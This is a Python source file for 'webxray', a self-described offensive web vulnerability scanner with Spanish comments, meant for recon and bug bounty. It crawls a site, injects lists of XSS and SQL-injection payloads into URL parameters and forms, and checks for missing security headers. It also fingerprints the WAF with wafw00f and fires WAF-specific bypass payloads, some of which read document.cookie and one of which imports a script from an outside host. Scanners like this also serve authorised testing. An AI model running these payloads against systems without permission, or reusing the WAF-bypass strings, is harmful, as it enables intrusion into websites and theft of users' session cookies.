#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""webxray – escaner ofensivo de vulnerabilidades web.

- Descubre URLs internas a partir de una URL inicial.
- Prueba XSS y SQLi sobre parametros GET y formularios POST.
- Revisa cabeceras de seguridad HTTP.
- Modo --waf-xss: detecta WAF y lanza payloads XSS especificos por WAF.
- Salida opcional en JSON/JSONL.

Pensado para recon / bug bounty como primer filtro rapido.
"""

__version__ = "1.2.0"

import argparse
import json
import signal
import subprocess
import sys
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qsl, urlencode, urlunparse

import requests
from bs4 import BeautifulSoup
from lxml import html
from termcolor import colored
from tqdm import tqdm


# Banner
def print_banner() -> None:
    banner = r"""
+------------------------------------------------------+
|                                                      |
|  ██████╗ ███████╗ ██████╗  ██╗ ██████╗  █████╗ ██╗  |
|  ██╔══██╗██╔════╝ ██╔══██╗██║██╔══██╗██╔══██╗██║  |
|  ██████╔╝█████╗  ██████╔╝██║██║  ██║███████║██║  |
|  ██╔═══╝ ██╔══╝  ██╔══██╗██║██║  ██║██╔══██║╚═╝  |
|  ██║     ███████╗██████╔╝██║██████╔╝██║  ██║██╗  |
|  ╚═╝     ╚══════╝╚═════╝ ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  |
|                                                      |
|  offensive web scanner  v{ver}  by theoffsecgirl  |
+------------------------------------------------------+
""".format(ver=__version__)
    print(colored(banner, "magenta"), file=sys.stderr)


# ─── Config ──────────────────────────────────────────────────────────────────

DEFAULT_HEADERS: Dict[str, str] = {
    "User-Agent": "Mozilla/5.0 (compatible; webxray/{} by theoffsecgirl)".format(__version__),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

XSS_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"autofocus onfocus=alert(1) x=\"",
]

SQLI_PAYLOADS: List[str] = [
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' UNION SELECT NULL-- -",
    "\" OR \"1\"=\"1",
    "1' AND SLEEP(3)-- -",
]

SQLI_ERROR_KW: List[str] = [
    "sql syntax", "mysql", "sql server", "sqlite",
    "odbc", "oracle", "pg::", "pdo", "syntax error",
    "unclosed quotation",
]

SECURITY_HEADERS: List[str] = [
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Strict-Transport-Security",
    "Permissions-Policy",
]

WAF_XSS_PAYLOADS: Dict[str, List[str]] = {
    "akamai": [
        "';k='e'%0Atop //",
        "'><A HRef=' AutoFocus OnFocus=top//?>. >",
    ],
    "cloudflare": [
        "<svg/onload=window>",
        "<Svg Only=1 OnLoad=confirm(document.cookie)>",
    ],
    "cloudfront": [
        "'>'><details/open/ontoggle=confirm('XSS')>",
        "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/",
    ],
    "modsecurity": [
        "<svg onload='new Function[\"Y000!\"].find(alert)'>",
    ],
    "imperva": [
        "<Img Src=//X55.is OnLoad%0C=import(Src)>",
        "<details open ontoggle=prompt(document.cookie)>",
    ],
    "sucuri": [
        "'><img src=x onerror=alert(document.cookie)>",
        "<button onClick='prompt(1337)'>Submit</button>",
    ],
}


# ─── Helpers ─────────────────────────────────────────────────────────────────

def signal_handler(sig, frame):  # type: ignore
    log_warn("Interrumpido por el usuario.")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)


def log_info(msg: str) -> None:
    print(colored("[+] {}".format(msg), "green"), file=sys.stderr)


def log_warn(msg: str) -> None:
    print(colored("[!] {}".format(msg), "yellow"), file=sys.stderr)


def log_error(msg: str) -> None:
    print(colored("[x] {}".format(msg), "red"), file=sys.stderr)


def normalize_url(base: str) -> str:
    if not base.startswith(("http://", "https://")):
        base = "https://" + base
    return base.rstrip("/")


def same_host(start_url: str, candidate: str) -> bool:
    a = urlparse(start_url)
    b = urlparse(candidate)
    return a.netloc == b.netloc or b.netloc == ""


def normalize_finding(finding: dict) -> dict:
    parsed = urlparse(finding.get("url", ""))
    host = parsed.netloc
    finding_type = finding.get("type", "unknown")

    normalized = {
        "type": "candidate",
        "vector": None,
        "target": finding.get("url"),
        "host": host,
        "method": "GET",
        "param": finding.get("parameter"),
        "severity": "medium",
        "confidence": "medium",
        "evidence": [],
        "tags": [],
        "raw": finding,
    }

    if finding_type == "xss":
        normalized["vector"] = "xss"
        normalized["evidence"] = ["payload reflected in response"]
        normalized["tags"] = ["reflection", "get-param"]
    elif finding_type == "sqli_get":
        normalized["vector"] = "sqli"
        normalized["evidence"] = ["sql error keyword or response diff detected"]
        normalized["tags"] = ["get-param", "candidate"]
        normalized["severity"] = "high"
    elif finding_type == "sqli_post":
        normalized["vector"] = "sqli"
        normalized["method"] = "POST"
        normalized["evidence"] = ["sql error keyword or response diff detected"]
        normalized["tags"] = ["post-form", "candidate"]
        normalized["severity"] = "high"
    elif finding_type == "missing_header":
        normalized["type"] = "header_issue"
        normalized["vector"] = "headers"
        normalized["severity"] = "low"
        normalized["confidence"] = "high"
        normalized["evidence"] = ["missing security header: {}".format(finding.get("header"))]
        normalized["tags"] = ["header-missing"]
        normalized["param"] = None
    elif finding_type == "waf_xss":
        normalized["vector"] = "xss"
        normalized["evidence"] = ["waf-oriented payload reflected in response"]
        normalized["tags"] = ["waf-bypass", "get-param"]
        normalized["raw"]["waf"] = finding.get("waf")
    elif finding_type == "waf_xss_form":
        normalized["vector"] = "xss"
        normalized["method"] = "POST"
        normalized["evidence"] = ["waf-oriented payload reflected in form response"]
        normalized["tags"] = ["waf-bypass", "form"]
        normalized["raw"]["waf"] = finding.get("waf")
    else:
        normalized["vector"] = finding_type
        normalized["confidence"] = "low"
        normalized["evidence"] = ["generic finding"]

    return normalized


def serialize_findings(findings: List[dict], fmt: str) -> str:
    if fmt == "jsonl":
        return "\n".join(json.dumps(f, ensure_ascii=False) for f in findings)
    return json.dumps(findings, indent=2, ensure_ascii=False)


def write_output(findings: List[dict], fmt: str, stdout: bool = False, output_file: Optional[str] = None) -> None:
    payload = serialize_findings(findings, fmt)

    if stdout or output_file == "-":
        print(payload)

    if output_file and output_file != "-":
        with open(output_file, "w", encoding="utf-8") as fout:
            fout.write(payload)
        log_info("Resultados guardados en {}".format(output_file))


# ─── Crawling ────────────────────────────────────────────────────────────────

def discover_urls(start_url: str, max_depth: int = 1, timeout: int = 10) -> List[str]:
    start_url = normalize_url(start_url)
    seen = {start_url}
    queue = [(start_url, 0)]
    discovered: List[str] = []

    session = requests.Session()
    session.headers.update(DEFAULT_HEADERS)

    while queue:
        current, depth = queue.pop(0)
        discovered.append(current)

        if depth >= max_depth:
            continue

        try:
            resp = session.get(current, timeout=timeout, verify=True)
        except requests.RequestException as e:
            log_warn("Error al solicitar {}: {}".format(current, e))
            continue

        try:
            tree = html.fromstring(resp.text)
        except Exception:
            continue

        for el in tree.xpath("//a[@href]"):
            href = el.get("href")
            if not href:
                continue
            full = urljoin(current, href).split("#", 1)[0]
            if full not in seen and same_host(start_url, full):
                seen.add(full)
                queue.append((full, depth + 1))

    return discovered


# ─── Scanners ────────────────────────────────────────────────────────────────

def mutate_url_with_payload(url: str, param: str, payload: str) -> Optional[str]:
    parsed = urlparse(url)
    qs = dict(parse_qsl(parsed.query, keep_blank_values=True))
    if param not in qs:
        return None
    qs[param] = payload
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def extract_params(url: str) -> List[str]:
    return list(dict(parse_qsl(urlparse(url).query, keep_blank_values=True)).keys())


def check_xss(session: requests.Session, url: str, timeout: int) -> List[dict]:
    params = extract_params(url)
    findings: List[dict] = []
    for p in params:
        for payload in XSS_PAYLOADS:
            mutated = mutate_url_with_payload(url, p, payload)
            if not mutated:
                continue
            try:
                r = session.get(mutated, timeout=timeout, verify=True)
            except requests.RequestException:
                continue
            if payload in r.text:
                log_warn("Posible XSS en {} param '{}' -> '{}'".format(url, p, payload))
                findings.append({
                    "type": "xss", "url": url,
                    "parameter": p, "payload": payload,
                    "status": r.status_code,
                })
                break
    return findings


def _sqli_hit(r: requests.Response, baseline: Optional[Tuple[int, int]]) -> bool:
    error_kw = any(e in r.text.lower() for e in SQLI_ERROR_KW)
    if baseline:
        status_changed = r.status_code != baseline[0]
        size_changed = abs(len(r.text) - baseline[1]) > 200
        return status_changed or size_changed or error_kw
    return error_kw


def check_sqli(session: requests.Session, url: str, timeout: int) -> List[dict]:
    """Prueba SQLi en parametros GET y en formularios POST."""
    findings: List[dict] = []

    params = extract_params(url)
    baseline: Optional[Tuple[int, int]] = None
    try:
        br = session.get(url, timeout=timeout, verify=True)
        baseline = (br.status_code, len(br.text))
    except requests.RequestException:
        pass

    for p in params:
        for payload in SQLI_PAYLOADS:
            mutated = mutate_url_with_payload(url, p, payload)
            if not mutated:
                continue
            try:
                r = session.get(mutated, timeout=timeout, verify=True)
            except requests.RequestException:
                continue
            if _sqli_hit(r, baseline):
                log_warn("Posible SQLi (GET) en {} param '{}' -> '{}'".format(url, p, payload))
                findings.append({
                    "type": "sqli_get", "url": url,
                    "parameter": p, "payload": payload,
                    "status": r.status_code,
                })
                break

    forms = extract_forms(url, timeout=timeout)
    for form in forms:
        if form["method"] != "post":
            continue
        form_url = form["url"]
        base_data = {k: "test" for k in form["inputs"]}
        form_baseline: Optional[Tuple[int, int]] = None
        try:
            br2 = session.post(form_url, data=base_data, timeout=timeout, verify=True)
            form_baseline = (br2.status_code, len(br2.text))
        except requests.RequestException:
            pass

        for input_name in form["inputs"]:
            for payload in SQLI_PAYLOADS:
                data = dict(base_data)
                data[input_name] = payload
                try:
                    r = session.post(form_url, data=data, timeout=timeout, verify=True)
                except requests.RequestException:
                    continue
                if _sqli_hit(r, form_baseline):
                    log_warn("Posible SQLi (POST) en {} campo '{}'".format(form_url, input_name))
                    findings.append({
                        "type": "sqli_post", "url": form_url,
                        "parameter": input_name, "payload": payload,
                        "status": r.status_code,
                    })
                    break

    return findings


def check_headers(session: requests.Session, url: str, timeout: int) -> List[dict]:
    try:
        r = session.get(url, timeout=timeout, verify=True)
    except requests.RequestException as e:
        log_warn("No se pudieron verificar cabeceras en {}: {}".format(url, e))
        return []
    missing = [h for h in SECURITY_HEADERS if h not in r.headers]
    if missing:
        log_warn("Cabeceras ausentes en {}: {}".format(url, ", ".join(missing)))
    return [{"type": "missing_header", "url": url, "header": h} for h in missing]


# ─── WAF + XSS avanzado ──────────────────────────────────────────────────────

def detect_waf(url: str) -> Optional[str]:
    """Detecta WAF via wafw00f. Requiere: pip install wafw00f"""
    try:
        result = subprocess.run(
            ["wafw00f", url],
            capture_output=True, text=True, timeout=60,
        )
        output = result.stdout or ""
        if "is behind" in output:
            waf = output.split("is behind")[-1].strip().splitlines()[0]
            log_warn("WAF detectado: {}".format(waf))
            return waf
        log_info("No se detecto WAF reconocible.")
        return None
    except FileNotFoundError:
        log_error("wafw00f no instalado: pip install wafw00f")
        return None
    except Exception as e:
        log_error("Error al ejecutar wafw00f: {}".format(e))
        return None


def get_waf_payloads(waf: Optional[str]) -> List[str]:
    base = list(XSS_PAYLOADS)
    if not waf:
        return base
    for key, payloads in WAF_XSS_PAYLOADS.items():
        if key in waf.lower():
            log_info("Usando payloads especificos para {}.".format(key))
            return payloads + base
    return base


def extract_forms(url: str, timeout: int = 20) -> List[dict]:
    try:
        r = requests.get(url, headers=DEFAULT_HEADERS, timeout=timeout, verify=True)
        soup = BeautifulSoup(r.text, "html.parser")
        forms: List[dict] = []
        for form in soup.find_all("form"):
            action = urljoin(url, form.get("action") or url)
            method = form.get("method", "get").lower()
            inputs: Dict[str, str] = {}
            for tag in form.find_all(["input", "textarea", "select"]):
                name = tag.get("name")
                if name:
                    inputs[name] = tag.get("type", "text")
            if inputs:
                forms.append({"url": action, "method": method, "inputs": inputs})
        log_info("Formularios encontrados: {}".format(len(forms)))
        return forms
    except requests.RequestException as e:
        log_error("Error al extraer formularios: {}".format(e))
        return []


def check_waf_xss(url: str, timeout: int) -> List[dict]:
    log_info("Iniciando modo WAF + XSS avanzado...")
    findings: List[dict] = []

    waf = detect_waf(url)
    payloads = get_waf_payloads(waf)

    params = extract_params(url)
    if params:
        session = requests.Session()
        session.headers.update(DEFAULT_HEADERS)
        for p in params:
            for payload in payloads:
                mutated = mutate_url_with_payload(url, p, payload)
                if not mutated:
                    continue
                try:
                    r = session.get(mutated, timeout=timeout, verify=True)
                except requests.RequestException:
                    continue
                if payload in r.text:
                    log_warn("[WAF-XSS] XSS en '{}' -> {}...".format(p, payload[:60]))
                    findings.append({
                        "type": "waf_xss", "url": url,
                        "parameter": p, "payload": payload,
                        "waf": waf or "none", "status": r.status_code,
                    })
                    break

    forms = extract_forms(url, timeout=timeout)
    for form in forms:
        form_url = form["url"]
        method = form["method"]
        for input_name in form["inputs"]:
            for payload in payloads:
                data = {input_name: payload}
                try:
                    if method == "post":
                        r = requests.post(form_url, data=data, timeout=timeout, verify=True)
                    else:
                        r = requests.get(form_url, params=data, timeout=timeout, verify=True)
                except requests.RequestException:
                    continue
                if payload in r.text:
                    log_warn("[WAF-XSS] XSS en form '{}' campo '{}'".format(form_url, input_name))
                    findings.append({
                        "type": "waf_xss_form", "url": form_url,
                        "parameter": input_name, "payload": payload,
                        "waf": waf or "none", "status": r.status_code,
                    })
                    break

    if not findings:
        log_info("WAF-XSS: sin hallazgos.")
    return findings


# ─── CLI ─────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="webxray – escaner ofensivo web by theoffsecgirl"
    )
    parser.add_argument("-u", "--url", required=True,
                        help="URL objetivo (ej: https://example.com)")
    parser.add_argument("-d", "--depth", type=int, default=1,
                        help="Profundidad de crawling (default: 1)")
    parser.add_argument("--no-xss", action="store_true", help="Omitir XSS basico")
    parser.add_argument("--no-sqli", action="store_true", help="Omitir SQLi")
    parser.add_argument("--no-headers", action="store_true", help="Omitir cabeceras")
    parser.add_argument("--waf-xss", action="store_true",
                        help="Modo WAF + XSS avanzado (requiere wafw00f)")
    parser.add_argument("-t", "--timeout", type=int, default=10,
                        help="Timeout en segundos (default: 10)")
    parser.add_argument("--json-output", help="Guardar resultados en JSON/JSONL")
    parser.add_argument("--format", choices=["json", "jsonl"], default="json",
                        help="Formato de salida para export y stdout")
    parser.add_argument("--stdout", action="store_true",
                        help="Enviar findings normalizados a stdout")
    parser.add_argument("-v", "--version", action="version",
                        version="webxray {}".format(__version__))
    return parser.parse_args()


# ─── Main ────────────────────────────────────────────────────────────────────

def main() -> None:
    print_banner()
    args = parse_args()

    start_url = normalize_url(args.url)
    timeout = args.timeout
    all_findings: List[dict] = []

    if args.waf_xss:
        all_findings.extend(check_waf_xss(start_url, timeout=timeout))
    else:
        log_info("Descubriendo URLs desde {} (profundidad {})".format(start_url, args.depth))
        urls = discover_urls(start_url, max_depth=args.depth, timeout=timeout)
        log_info("URLs descubiertas: {}".format(len(urls)))

        session = requests.Session()
        session.headers.update(DEFAULT_HEADERS)

        for u in tqdm(urls, desc="Escaneando", unit="url", file=sys.stderr):
            if not args.no_xss:
                all_findings.extend(check_xss(session, u, timeout=timeout))
            if not args.no_sqli:
                all_findings.extend(check_sqli(session, u, timeout=timeout))
            if not args.no_headers:
                all_findings.extend(check_headers(session, u, timeout=timeout))

    log_info("Escaneo completado. Hallazgos: {}".format(len(all_findings)))

    resumen: Dict[str, int] = {}
    for finding in all_findings:
        resumen[finding["type"]] = resumen.get(finding["type"], 0) + 1
    if resumen:
        log_info("Resumen por tipo:")
        for tipo, count in resumen.items():
            print("  - {}: {}".format(tipo, count), file=sys.stderr)
    else:
        log_info("Sin hallazgos con las heuristicas usadas.")

    normalized_findings = [normalize_finding(f) for f in all_findings]

    if args.json_output or args.stdout:
        try:
            write_output(
                normalized_findings,
                fmt=args.format,
                stdout=args.stdout,
                output_file=args.json_output,
            )
        except OSError as e:
            log_error("No se pudo escribir salida: {}".format(e))


if __name__ == "__main__":
    main()
